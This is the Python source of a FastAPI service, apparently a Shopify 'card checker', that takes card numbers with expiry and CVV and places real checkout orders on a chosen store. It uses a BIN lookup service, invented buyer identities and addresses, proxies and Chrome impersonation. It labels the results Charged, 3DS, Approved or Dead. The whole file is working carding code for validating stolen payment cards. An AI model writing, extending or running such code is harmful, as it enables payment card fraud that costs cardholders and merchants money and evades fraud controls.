import asyncio
import json
import re
import random
import uuid
import os
from urllib.parse import urlparse
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, StreamingResponse
from fastapi.middleware.cors import CORSMiddleware
from curl_cffi.requests import AsyncSession
import uvicorn

app = FastAPI()

# Allow CORS supaya webhosting boleh connect
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

active_streams = {}

# ==================== SHOPIFY GATEWAY LOGIC ====================

book = {
    "US": {"address1": "123 Main", "city": "NY", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
    "CA": {"address1": "88 Queen", "city": "Toronto", "postalCode": "M5J2J3", "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198"},
    "GB": {"address1": "221B Baker Street", "city": "London", "postalCode": "NW1 6XE", "zoneCode": "LND", "countryCode": "GB", "phone": "2079460123"},
    "DEFAULT": {"address1": "123 Main", "city": "New York", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
}

MUTATION_SUBMIT = 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token __typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}'

QUERY_POLL = 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}__typename}__typename}__typename}'

def extract_between(text, start, end):
    if not text or not start or not end: return None
    try:
        if start in text:
            parts = text.split(start, 1)
            if len(parts) > 1:
                if end in parts[1]:
                    result = parts[1].split(end, 1)[0]
                    return result if result else None
        return None
    except Exception: return None

def parse_proxy(proxy_str):
    if not proxy_str: return None
    proxy_str = proxy_str.strip()
    if proxy_str.startswith("http://") or proxy_str.startswith("https://"): return proxy_str
    parts = proxy_str.split(':')
    if len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
    elif len(parts) == 4: return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    else: return f"http://{proxy_str}"

async def fetch_products(domain, proxy_str=None):
    try:
        if not domain.startswith('http'): domain = "https://" + domain
        proxy = parse_proxy(proxy_str) if proxy_str else None
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'Accept': 'application/json, text/plain, */*'}
        async with AsyncSession(impersonate="chrome120", proxy=proxy, timeout=15) as session:
            resp = await session.get(f"{domain}/products.json", headers=headers)
            if resp.status_code != 200: return False, f"Site Error! Status: {resp.status_code}"
            if "shopify" not in resp.text.lower(): return False, "Not Shopify!"
            result = resp.json().get('products', [])
            if not result: return False, "No Products!"
        min_price = float('inf')
        min_product = None
        for product in result:
            for variant in product.get('variants', []):
                if not variant.get('available', True): continue
                try:
                    price = float(str(variant.get('price', '0')).replace(',', ''))
                    if price <= 0 or price >= min_price: continue
                    min_price = price
                    min_product = {'site': domain, 'price': f"{price:.2f}", 'variant_id': str(variant['id']), 'link': f"{domain}/products/{product['handle']}"}
                except: continue
        if min_product: return min_product
        return False, "No Valid Products"
    except Exception as e: return False, f"Proxy/Connection Error: {str(e)[:50]}"

async def fetch_bin_country(card_number, proxy_str=None):
    try:
        proxy = parse_proxy(proxy_str) if proxy_str else None
        async with AsyncSession(impersonate="chrome120", proxy=proxy, timeout=5) as session:
            res = await session.get(f"https://bins.antipublic.cc/bins/{card_number.strip()[:6]}")
            if res.status_code == 200:
                c = res.json().get("country", "")
                if c and len(c) == 2: return c.upper()
    except: pass
    return "US"

def get_address_for_country(country_code):
    country_code = (country_code or "US").upper()
    if country_code == "US":
        return {"address1": f"{random.randint(100, 9999)} Main St", "city": "New York", "postalCode": "10001", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"}
    elif country_code == "CA":
        return {"address1": f"{random.randint(100, 999)} Queen St", "city": "Toronto", "postalCode": "M5V 2T6", "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198"}
    elif country_code == "GB":
        return {"address1": f"{random.randint(1, 150)} High St", "city": "London", "postalCode": "EC1A 1BB", "zoneCode": "LND", "countryCode": "GB", "phone": "2079460123"}
    else:
        addr = book.get(country_code, book["DEFAULT"]).copy()
        addr["address1"] = f"{random.randint(10, 999)} {addr['address1']}"
        return addr

async def process_card(queue, cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
    gateway = "UNKNOWN"
    total_price = "0.00"
    currency = "USD"
    ourl = site_url.strip().rstrip('/')
    if not ourl.startswith('http'): ourl = f'https://{ourl}'
    proxy = parse_proxy(proxy_str) if proxy_str else None
    
    first_name = random.choice(["John", "Emily", "Alex", "Sarah"])
    last_name = random.choice(["Smith", "Johnson", "Williams", "Brown"])
    email = f"{first_name.lower()}.{last_name.lower()}{random.randint(1, 999)}@gmail.com"
    
    bin_country = await fetch_bin_country(cc, proxy_str)
    billing_addr = get_address_for_country(bin_country)
    shipping_addr = billing_addr
    
    b_add1, b_city = billing_addr["address1"], billing_addr["city"]
    b_state_short, b_zip_code = billing_addr["zoneCode"], billing_addr["postalCode"]
    b_phone, b_country_code = billing_addr["phone"], billing_addr["countryCode"]
    s_add1, s_city, s_state_short, s_zip_code, s_phone, s_country_code = b_add1, b_city, b_state_short, b_zip_code, b_phone, b_country_code
    
    try:
        if not variant_id:
            await queue.put({"type": "log", "msg": "[STEP 1] Fetching products..."})
            info = await fetch_products(ourl, proxy_str)
            if isinstance(info, tuple) and info[0] is False:
                await queue.put({"type": "log", "msg": f"[ERROR STEP 1] {info[1]}"})
                return False, info[1], gateway, total_price, currency
            variant_id = info['variant_id']
            total_price = info['price']
            await queue.put({"type": "log", "msg": f"[STEP 1 OK] Found product | Price: ${total_price}"})
        else:
            total_price = "0.01"

        product_headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        }

        async with AsyncSession(impersonate="chrome120", proxy=proxy, timeout=30) as session:
            await queue.put({"type": "log", "msg": "[STEP 2] Visiting product page & cart..."})
            try:
                await session.get(f"{ourl}/products/any", headers=product_headers)
                await session.get(f"{ourl}/cart.js", headers=product_headers)
            except: pass

            await queue.put({"type": "log", "msg": f"[STEP 3] Adding variant {variant_id} to cart..."})
            add_data = f"id={variant_id}&quantity=1&form_type=product"
            try:
                resp = await session.post(f"{ourl}/cart/add.js", headers={**product_headers, 'Content-Type': 'application/x-www-form-urlencoded'}, data=add_data)
                if resp.status_code != 200:
                    json_data = {'items': [{'id': int(variant_id), 'quantity': 1}]}
                    await session.post(f"{ourl}/cart/add.js", headers={**product_headers, 'Content-Type': 'application/json'}, json=json_data)
            except Exception as e:
                return False, f"Cart addition failed: {str(e)}", gateway, total_price, currency

            cart_token = ""
            try:
                resp = await session.get(f"{ourl}/cart.js", headers=product_headers)
                if resp.status_code == 200: cart_token = resp.json().get('token', '')
            except: pass

            await queue.put({"type": "log", "msg": "[STEP 4] Triggering checkout flow..."})
            checkout_headers = {**product_headers, 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': ourl, 'Referer': f"{ourl}/cart"}
            
            try:
                await session.get(f"{ourl}/checkout", headers=checkout_headers)
                resp = await session.post(f"{ourl}/cart", headers=checkout_headers, data={'checkout': '', 'updates[]': '1'}, allow_redirects=True)
                checkout_url = str(resp.url)
                text = resp.text
            except Exception as e:
                return False, f"Checkout redirect failed: {str(e)}", gateway, total_price, currency

            if 'login' in checkout_url.lower(): return False, "Site requires login!", gateway, total_price, currency

            await queue.put({"type": "log", "msg": "[STEP 5] Extracting Session Token (SST)..."})
            sst = None
            sst_match = re.search(r'serialized-sessionToken"\s+content="(?:&quot;)?([^"&]+)(?:&quot;)?"', text)
            if sst_match: sst = sst_match.group(1)
            else:
                sst = extract_between(text, '"serializedSessionToken":"', '"') or extract_between(text, 'data-session-token="', '"') or extract_between(text, '"sessionToken":"', '"')

            if not sst: return False, "Failed to get session token", gateway, total_price, currency
            await queue.put({"type": "log", "msg": f"[STEP 5 OK] SST Extracted: {sst[:20]}..."})

            queue_token = extract_between(text, 'queueToken&quot;:&quot;', '&quot;') or extract_between(text, '"queueToken":"', '"') or ""
            stable_id = extract_between(text, 'stableId&quot;:&quot;', '&quot;') or extract_between(text, '"stableId":"', '"') or ""
            paymentMethodIdentifier = "credit_card"

            currency = 'USD'
            if 'currencyCode&quot;:&quot;' in text: currency = extract_between(text, 'currencyCode&quot;:&quot;', '&quot;') or 'USD'
            elif '"currencyCode":"' in text: currency = extract_between(text, '"currencyCode":"', '"') or 'USD'

            attempt_token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
            c_token = attempt_token_match.group(1) if attempt_token_match else checkout_url.split('/')[-1].split('?')[0]
            if not c_token or len(c_token) < 5 or 'checkout' in c_token: c_token = cart_token or ""

            await queue.put({"type": "log", "msg": "[STEP 6] Tokenizing card at shopifycs.com..."})
            session_endpoints = ["https://deposit.us.shopifycs.com/sessions", "https://checkout.pci.shopifyinc.com/sessions", "https://checkout.shopifycs.com/sessions"]
            sessionid = None
            token_error = "Unable to get payment token"
            for endpoint in session_endpoints:
                try:
                    payload = {"credit_card": {"number": cc.replace(" ", ""), "name": f"{first_name} {last_name}", "month": int(mes), "year": int(ano), "verification_value": cvv}, "payment_session_scope": urlparse(ourl).netloc}
                    token_resp = await session.post(endpoint, json=payload, headers={'accept': 'application/json', 'content-type': 'application/json', 'origin': 'https://checkout.shopifycs.com', 'user-agent': product_headers['User-Agent']})
                    if token_resp.status_code == 200:
                        sessionid = token_resp.json().get('id')
                        if sessionid: break
                    else: token_error = f"Status {token_resp.status_code}"
                except Exception as e: token_error = str(e)

            if not sessionid: return False, f"Tokenization failed: {token_error}", gateway, total_price, currency
            await queue.put({"type": "log", "msg": f"[STEP 6 OK] Card Tokenized!"})

            await asyncio.sleep(random.uniform(2.0, 3.0))
            await queue.put({"type": "log", "msg": "[STEP 7] Submitting GraphQL (SubmitForCompletion)..."})
            graphql_url = f'{ourl}/api/2024-01/graphql.json'
            
            graphql_headers = {
                'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': ourl, 'Referer': f"{ourl}/",
                'User-Agent': product_headers['User-Agent'], 'X-Checkout-One-Session-Token': sst, 'X-Checkout-Web-Deploy-Stage': 'production',
                'X-Checkout-Web-Server-Handling': 'fast', 'X-Checkout-Web-Source-Id': c_token
            }

            graphql_payload = {
                'query': MUTATION_SUBMIT,
                'variables': {
                    'input': {
                        'checkpointData': None, 'sessionInput': {'sessionToken': sst}, 'queueToken': queue_token,
                        'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                        'delivery': {
                            'deliveryLines': [{
                                'selectedDeliveryStrategy': {'deliveryStrategyMatchingConditions': {'estimatedTimeInTransit': {'any': True}, 'shipments': {'any': True}}, 'options': {}},
                                'targetMerchandiseLines': {'lines': [{'stableId': stable_id}]},
                                'destination': {'streetAddress': {'address1': s_add1, 'address2': '', 'city': s_city, 'countryCode': s_country_code, 'postalCode': s_zip_code, 'company': '', 'firstName': first_name, 'lastName': last_name, 'zoneCode': s_state_short, 'phone': s_phone}},
                                'deliveryMethodTypes': ['SHIPPING'], 'expectedTotalPrice': {'any': True}, 'destinationChanged': True,
                            }],
                            'noDeliveryRequired': [], 'useProgressiveRates': False, 'prefetchShippingRatesStrategy': None,
                        },
                        'merchandise': {
                            'merchandiseLines': [{
                                'stableId': stable_id, 'merchandise': {'productVariantReference': {'id': f'gid://shopify/ProductVariantMerchandise/{variant_id}', 'variantId': f'gid://shopify/ProductVariant/{variant_id}', 'properties': [], 'sellingPlanId': None, 'sellingPlanDigest': None}},
                                'quantity': {'items': {'value': 1}}, 'expectedTotalPrice': {'any': True}, 'lineComponentsSource': None, 'lineComponents': [],
                            }],
                        },
                        'payment': {
                            'totalAmount': {'value': {'amount': total_price, 'currencyCode': currency}},
                            'paymentLines': [{
                                'paymentMethod': {'directPaymentMethod': {'paymentMethodIdentifier': paymentMethodIdentifier, 'sessionId': sessionid, 'billingAddress': {'streetAddress': {'address1': b_add1, 'address2': '', 'city': b_city, 'countryCode': b_country_code, 'postalCode': b_zip_code, 'company': '', 'firstName': first_name, 'lastName': last_name, 'zoneCode': b_state_short, 'phone': b_phone}}, 'cardSource': None}},
                                'amount': {'value': {'amount': total_price, 'currencyCode': currency}}, 'dueAt': None,
                            }],
                            'billingAddress': {'streetAddress': {'address1': b_add1, 'address2': '', 'city': b_city, 'countryCode': b_country_code, 'postalCode': b_zip_code, 'company': '', 'firstName': first_name, 'lastName': last_name, 'zoneCode': b_state_short, 'phone': b_phone}},
                        },
                        'buyerIdentity': {'buyerIdentity': {'presentmentCurrency': currency, 'countryCode': s_country_code}, 'contactInfoV2': {'emailOrSms': {'value': email, 'emailOrSmsChanged': False}}, 'marketingConsent': [{'email': {'value': email}}], 'shopPayOptInPhone': {'countryCode': s_country_code}},
                        'tip': {'tipLines': []}, 'taxes': {'proposedAllocations': None, 'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': currency}}, 'proposedTotalIncludedAmount': None, 'proposedMixedStateTotalAmount': None, 'proposedExemptions': []},
                        'note': {'message': None, 'customAttributes': []}, 'localizationExtension': {'fields': []}, 'nonNegotiableTerms': None,
                        'scriptFingerprint': {'signature': None, 'signatureUuid': None, 'lineItemScriptChanges': [], 'paymentScriptChanges': [], 'shippingScriptChanges': []}, 'optionalDuties': {'buyerRefusesDuties': False},
                    },
                    'attemptToken': f'{c_token}-{random.random()}', 'metafields': [], 'analytics': {'requestUrl': f'{ourl}/checkouts/cn/{c_token}', 'pageId': str(uuid.uuid4())},
                },
                'operationName': 'SubmitForCompletion',
            }

            receipt_id = None
            for submit_attempt in range(2):
                try:
                    graphql_resp = await session.post(graphql_url, headers=graphql_headers, json=graphql_payload, timeout=15)
                    if graphql_resp.status_code != 200:
                        if submit_attempt == 0: await asyncio.sleep(2); continue
                        return False, f"GraphQL failed: Status {graphql_resp.status_code}", gateway, total_price, currency
                    
                    result_data = graphql_resp.json()
                    await queue.put({"type": "log", "msg": f"[RAW GQL RESPONSE] {json.dumps(result_data)[:300]}"})
                    
                    completion = result_data.get('data', {}).get('submitForCompletion', {})
                    typename = completion.get('__typename')
                    
                    if typename == 'CheckpointDenied': return True, "CARD_DECLINED", gateway, total_price, currency
                    if completion.get('receipt'): receipt_id = completion['receipt'].get('id')
                    
                    if completion.get('errors'):
                        error_codes = [e.get('code') for e in completion['errors'] if 'code' in e]
                        soft_errors = ['TAX_NEW_TAX_MUST_BE_ACCEPTED', 'WAITING_PENDING_TERMS']
                        if all(code in soft_errors for code in error_codes) and submit_attempt == 0:
                            graphql_payload['variables']['attemptToken'] = f'{c_token}-{random.random()}'
                            await asyncio.sleep(2); continue
                        non_soft_errors = [code for code in error_codes if code not in soft_errors]
                        if non_soft_errors: return True, ', '.join(non_soft_errors), gateway, total_price, currency
                    
                    if completion.get('reason'): return True, completion['reason'], gateway, total_price, currency
                    break
                except Exception as e:
                    if submit_attempt == 0: await asyncio.sleep(2); continue
                    return False, f"GraphQL exception: {str(e)}", gateway, total_price, currency

            if receipt_id:
                await queue.put({"type": "log", "msg": "[STEP 8] Polling for receipt status..."})
                poll_payload = {'query': QUERY_POLL, 'variables': {'receiptId': receipt_id, 'sessionToken': sst}, 'operationName': 'PollForReceipt'}
                for poll_attempt in range(6):
                    await asyncio.sleep(3)
                    try:
                        poll_resp = await session.post(graphql_url, headers=graphql_headers, json=poll_payload, timeout=7)
                        if poll_resp.status_code == 200:
                            receipt = poll_resp.json().get('data', {}).get('receipt', {})
                            typename = receipt.get('__typename')
                            if typename == 'ProcessedReceipt' or 'orderIdentity' in receipt: return True, "ORDER_PLACED", gateway, total_price, currency
                            elif typename == 'ActionRequiredReceipt': return True, "OTP_REQUIRED", gateway, total_price, currency
                            elif typename == 'FailedReceipt':
                                code = receipt.get('processingError', {}).get('code') or "CARD_DECLINED"
                                return True, code, gateway, total_price, currency
                    except: pass

            await queue.put({"type": "log", "msg": "[STEP 9] Running fallback HTML check..."})
            try:
                final_resp = await session.get(f"{ourl}/checkout?from_processing_page=1&validate=true", headers=product_headers, timeout=10)
                final_url, final_text = str(final_resp.url), final_resp.text
                if "/thank" in final_url.lower() or "/orders/" in final_url: return True, "ORDER_PLACED", gateway, total_price, currency
                final_lower = final_text.lower()
                if "insufficient funds" in final_lower: return True, "INSUFFICIENT_FUNDS", gateway, total_price, currency
                elif "security code is incorrect" in final_lower: return True, "INCORRECT_CVC", gateway, total_price, currency
                elif "three_d_secure" in final_lower or "cardinalcommerce" in final_lower: return True, "OTP_REQUIRED", gateway, total_price, currency
                elif "declined" in final_lower: return True, "CARD_DECLINED", gateway, total_price, currency
            except: pass

            return True, "CARD_DECLINED", gateway, total_price, currency

    except Exception as e:
        return False, f"Error Processing Card: {str(e)}", gateway, total_price, currency

def _classify_response(response_text: str) -> tuple:
    resp = str(response_text).strip()
    resp_lower = resp.lower()
    charged_patterns = ['thank you', 'order_paid', 'order_successful', 'order_placed', 'charged', 'successfully paid', 'processedreceipt']
    tds_patterns = ['3ds', 'otp_required', 'action_required', 'authentication_required', 'verify_otp']
    approved_patterns = ['incorrect_cvc', 'insufficient_funds', 'incorrect_cvv', 'cvc_check_failed', 'cvv_gateway_error', 'incorrect_pin', 'incorrect_zip']
    declined_patterns = ['declined', 'card_declined', 'generic_error', 'do_not_honor', 'expired_card', 'fraudulent', 'generic_decline', 'lost', 'stolen', 'invalid_number']
    
    if any(k in resp_lower for k in charged_patterns): return "Charged", resp, "-"
    if any(k in resp_lower for k in tds_patterns): return "3DS", resp, "-"
    if any(k in resp_lower for k in approved_patterns): return "Approved", resp, "-"
    if any(k in resp_lower for k in declined_patterns): return "Dead", resp, "-"
    return "Error", resp if resp else "No response", "-"

# ==================== FASTAPI ENDPOINTS ====================

@app.post("/api/stream-checkout")
async def api_stream_checkout(request: Request):
    req_data = await request.json()
    card_str = req_data.get("card_str")
    site_url = req_data.get("site_url")
    proxy_str = req_data.get("proxy_str")

    job_id = str(uuid.uuid4())
    queue = asyncio.Queue()
    active_streams[job_id] = queue

    async def background_task():
        try:
            parts = card_str.split("|")
            if len(parts) == 4:
                cc, mes, ano, cvv = parts
                cc, mes, ano, cvv = cc.strip(), mes.strip(), ano.strip(), cvv.strip()
                if len(ano) == 2: ano = "20" + ano
            else:
                await queue.put({"type": "error", "msg": "Invalid card format"})
                return

            await queue.put({"type": "log", "msg": "[INIT] Engine processing started..."})
            success, message, gateway, price, currency = await process_card(queue, cc=cc, mes=mes, ano=ano, cvv=cvv, site_url=site_url, proxy_str=proxy_str)
            final_msg = message if message else "UNKNOWN_ERROR"
            status, _, _ = _classify_response(final_msg)
            await queue.put({"type": "result", "status": status, "message": final_msg, "price": price})
        except Exception as e:
            await queue.put({"type": "error", "msg": f"Fatal Background Error: {str(e)}"})
        finally:
            await queue.put({"type": "done"})
            await asyncio.sleep(2)
            if job_id in active_streams: del active_streams[job_id]

    asyncio.create_task(background_task())

    async def event_generator():
        while True:
            try:
                data = await asyncio.wait_for(queue.get(), timeout=30.0)
                if data.get("type") == "done":
                    yield f"data: {json.dumps(data)}\n\n"
                    break
                yield f"data: {json.dumps(data)}\n\n"
            except asyncio.TimeoutError:
                yield f"data: {json.dumps({'type': 'log', 'msg': '[KEEP-ALIVE] Waiting for backend process...'})}\n\n"

    return StreamingResponse(event_generator(), media_type="text/event-stream")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
